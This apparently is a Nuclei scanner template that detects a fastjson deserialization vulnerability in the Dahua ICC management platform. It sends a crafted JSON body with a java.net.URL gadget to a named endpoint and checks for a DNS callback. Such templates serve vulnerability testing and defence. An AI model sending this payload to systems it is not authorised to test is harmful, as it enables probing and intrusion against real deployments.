id: DH_ICC_fastjson_Deserialization_Vulnerability

info:
  name: DH_ICC_fastjson_Deserialization_Vulnerability
  author: onewin
  severity: high
  description: 大华智能物联ICC综合管理平台 fastjson反序列化漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/evo-runs/v1.0/auths/sysusers/random"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Content-Type: application/json;charset=utf-8
      Accept-Encoding: gzip
      Connection: close

    body: |
      {
        "a": {
          "@type":"com.alibaba.fastjson.JSONObject",
          "b":{"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
        }
      }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol # This needs to be set up in your Nuclei configuration to capture and analyze DNS requests.

